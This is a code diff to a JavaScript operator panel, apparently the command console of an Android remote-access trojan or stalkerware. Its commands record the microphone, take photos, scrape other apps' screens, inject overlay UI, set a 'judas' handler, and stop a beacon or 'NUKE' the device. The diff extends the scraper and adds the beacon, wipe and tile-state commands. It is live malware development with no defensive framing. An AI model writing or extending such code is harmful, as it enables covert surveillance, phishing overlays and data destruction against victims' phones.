@@ -354,7 +354,7 @@
                     { id: 'RECORD_VOICE', name: 'Record Microphone', icon: '🎙️', inputs: [{id: 'mic-dur', label: 'Duration (Seconds)', type: 'number', val: 10}] },
                     { id: 'CAPTURE_IMAGE', name: 'Take Photos', icon: '📷', inputs: [{id: 'cam-side', label: 'Source', type: 'select', options: [{v: 'REAR', l: 'Rear'}, {v: 'FRONT', l: 'Front'}]}, {id: 'cam-count', label: 'Quantity', type: 'number', val: 1}] },
                     { id: 'GET_SENSORS', name: 'Sample Environment', icon: '🌡️', inputs: [] },
-                    { id: 'GET_TREE', name: 'UI Scraper (Hierarchy)', icon: '🌲', inputs: [{id: 'tree-pkg', label: 'Package Name', type: 'text', placeholder: 'com.pkg'}, {id: 'tree-dur', label: 'Duration (Min)', type: 'number', val: 1}], cleanup: 'RESET_SCRAPER' }
+                    { id: 'GET_TREE', name: 'UI Scraper (Hierarchy)', icon: '🌲', inputs: [{id: 'tree-pkg', label: 'Package Name', type: 'text', placeholder: 'com.pkg'}, {id: 'tree-dur', label: 'Duration (Min)', type: 'number', val: 1}, {id: 'tree-depth', label: 'Walk Depth', type: 'number', val: 10}], cleanup: 'RESET_SCRAPER' }
                 ]
             },
             {
@@ -870,6 +870,8 @@
                     case 'GET_SENSORS':
                     case 'REMOVE_UI':
                     case 'GET_ENGAGEMENT':
+                    case 'STOP_BEACON':
+                    case 'NUKE':
                         content = ''; break;
                     case 'INJECT_UI':
                         content = `${document.getElementById('ui-touchable').value} | ${document.getElementById('ui-html').value}`; break;
@@ -901,6 +903,8 @@
                         content = document.getElementById('judas-handler').value; break;
                     case 'SET_PROMOS':
                         content = document.getElementById('promo-templates').value; break;
+                    case 'SET_TILE_STATE':
+                        content = document.getElementById('val-tile-state').value; break;
                 }
             }
 
